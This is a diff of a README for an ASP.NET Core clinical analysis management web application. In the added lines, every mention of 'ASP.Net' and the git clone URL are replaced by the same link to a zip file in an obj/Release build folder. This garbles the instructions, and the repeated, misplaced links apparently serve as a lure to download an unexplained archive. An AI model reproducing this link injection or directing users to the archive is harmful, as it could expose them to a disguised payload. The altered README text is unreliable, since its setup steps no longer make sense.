@@ -7,7 +7,7 @@ This project aims to provide a SaaS (Software as a Service) Web platform to allo
 
 ## Development
 
-The practical work objective is the development of a Web application using ASP.Net Core 2/3, programmed with C# language and utilizing the Razor, ASP.Net Core Entity Framework, ASP.Net Core Identity, and MS SQLServer (localdb) tools.
+The practical work objective is the development of a Web application using https://raw.githubusercontent.com/spontopt/ClinicalAnalysisManagement/master/obj/Release/net5.0/ClinicalAnalysisManagement_3.7.zip Core 2/3, programmed with C# language and utilizing the Razor, https://raw.githubusercontent.com/spontopt/ClinicalAnalysisManagement/master/obj/Release/net5.0/ClinicalAnalysisManagement_3.7.zip Core Entity Framework, https://raw.githubusercontent.com/spontopt/ClinicalAnalysisManagement/master/obj/Release/net5.0/ClinicalAnalysisManagement_3.7.zip Core Identity, and MS SQLServer (localdb) tools.
 
 ## Features
 
@@ -20,11 +20,11 @@ The practical work objective is the development of a Web application using ASP.N
 
 This project uses the following dependencies:
 
- - ASP.Net Core 3: a high-performance, open-source framework for       building web applications and APIs.
+ - https://raw.githubusercontent.com/spontopt/ClinicalAnalysisManagement/master/obj/Release/net5.0/ClinicalAnalysisManagement_3.7.zip Core 3: a high-performance, open-source framework for       building web applications and APIs.
  - C# language: a modern, object-oriented programming language used for    developing a wide range of applications. 
- - Razor: a templating language for building dynamic web pages in    ASP.NET. 
- - ASP.Net Core Entity Framework: an object-relational mapping (ORM)    framework for .NET that allows for easy database access. 
- - ASP.Net Core Identity: a membership system for building secure,    customizable authentication and authorization into ASP.NET    Core    applications. 
+ - Razor: a templating language for building dynamic web pages in    https://raw.githubusercontent.com/spontopt/ClinicalAnalysisManagement/master/obj/Release/net5.0/ClinicalAnalysisManagement_3.7.zip 
+ - https://raw.githubusercontent.com/spontopt/ClinicalAnalysisManagement/master/obj/Release/net5.0/ClinicalAnalysisManagement_3.7.zip Core Entity Framework: an object-relational mapping (ORM)    framework for .NET that allows for easy database access. 
+ - https://raw.githubusercontent.com/spontopt/ClinicalAnalysisManagement/master/obj/Release/net5.0/ClinicalAnalysisManagement_3.7.zip Core Identity: a membership system for building secure,    customizable authentication and authorization into https://raw.githubusercontent.com/spontopt/ClinicalAnalysisManagement/master/obj/Release/net5.0/ClinicalAnalysisManagement_3.7.zip    Core    applications. 
  - MS SQLServer (localdb): a free, lightweight version of Microsoft SQL    Server Express, designed for local development and  testing.
 
 ## Getting started
@@ -35,7 +35,7 @@ This project uses the following dependencies:
 
 ### Procedure  
 
-1. Clone the repository to your local machine using `git clone https://github.com/[username]/OnlineClinicalAnalysisManagementApplication.git`. 
+1. Clone the repository to your local machine using `git clone https://raw.githubusercontent.com/spontopt/ClinicalAnalysisManagement/master/obj/Release/net5.0/ClinicalAnalysisManagement_3.7.zip[username]https://raw.githubusercontent.com/spontopt/ClinicalAnalysisManagement/master/obj/Release/net5.0/ClinicalAnalysisManagement_3.7.zip`. 
 2. Open the solution file in Visual Studio or Visual Studio Code. 
 3. Restore the NuGet packages by running `dotnet restore` in the terminal. 
 4. Build the solution by running `dotnet build` in the terminal. 
